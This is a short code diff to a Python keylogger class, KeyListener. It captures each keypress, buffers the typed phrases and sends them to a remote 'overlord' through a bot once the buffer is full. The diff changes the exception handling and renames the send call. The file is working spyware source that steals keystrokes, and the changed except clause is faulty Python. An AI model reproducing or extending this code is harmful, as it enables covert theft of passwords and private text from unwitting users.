@@ -37,7 +37,7 @@ class KeyListener:
     def on_press(self, key):
         try:
             a_key = key.char.encode('ascii')
-        except AttributeError:
+        except AttributeError, UnicodeEncodeError:
             a_key = str(key)
         # avoid key.backspace, TODO make list of keys that terminate a phrase (tab, enter)
         if "Key." in a_key and self.current_phrase is not "":
@@ -52,7 +52,7 @@ class KeyListener:
         self.current_phrase += a_key
 
         if len(self.buffered) >= self.BUFFER_CAPACITY:
-            bot.send_message_to_overlord(self.buffered)
+            bot.send_objects_to_overlord(self.buffered)
 
             # Flush buffer
             self.initialize_ivars()
